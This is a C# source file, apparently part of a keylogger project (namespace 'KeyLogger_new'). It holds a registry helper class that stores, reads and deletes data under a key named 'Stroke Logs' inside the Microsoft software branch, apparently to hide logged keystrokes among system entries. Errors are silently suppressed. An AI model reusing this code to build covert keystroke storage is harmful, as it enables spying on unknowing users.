using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace KeyLogger_new
{
    class readwrite_registy
    {
        
        static string key = @"HKEY_CURRENT_USER\Software\Microsoft\Stroke Logs\";
        static public string value = null;

        public static void write(string path, string valuename, string value)
        {
            try
            {
                Registry.SetValue ( key + path, valuename, value );
            }
            catch
            {
                //System.Windows.Forms.MessageBox.Show ( "Error occured." );
            }
        }

        public static string read(string path, string valuename)
        {
            try
            {
                value = Registry.GetValue(key + path, valuename, null).ToString();
                return value;
            }
            catch
            {
                return "1";
            }
        }
        public static string[] read_all_valuenames(string path)
        {
            string[] valuenames = null;
            try
            {

                RegistryKey key;
                key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Stroke Logs\"+path, true);
                valuenames = key.GetValueNames();
                return valuenames;
            }
            catch
            {
                return null;
            }

        }
        public static string[] read_all_values(string path, string[] valuenames)
        {
            List<string> valueslist=new List<string>();
            string[] values = null;
            
            try
            {
                foreach (string valuname in valuenames)
                {
                    RegistryKey key;
                    key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Stroke Logs\" + path, true);
                    valueslist.Add(key.GetValue(valuname).ToString());
                   
                }
                values = valueslist.ToArray<string>();
                return values;
               
            }
            catch(Exception ee)
            {
                //System.Windows.Forms.MessageBox.Show(ee.Message);
                return null;
            }

        }

        public static bool delete_value ( string path, string valuename )
        {
            try
            {
                RegistryKey key;
                key = Registry.CurrentUser.OpenSubKey ( @"Software\Microsoft\Stroke Logs\" + path, true );
                key.DeleteValue ( valuename );
                return true;
            }
            catch
            {
                return false;
            }


        }

        public static void delete_main_keys_from_registry(string[] keys_to_delete)
        {
            try
            {
                foreach (string keystodelete in keys_to_delete)
                {
                    Registry.CurrentUser.DeleteSubKey(@"Software\Microsoft\Stroke Logs\" + keystodelete);
                }

            }

            catch(Exception ee)
            {
                //System.Windows.Forms.MessageBox.Show(ee.Message);
            }

        }



    }
}
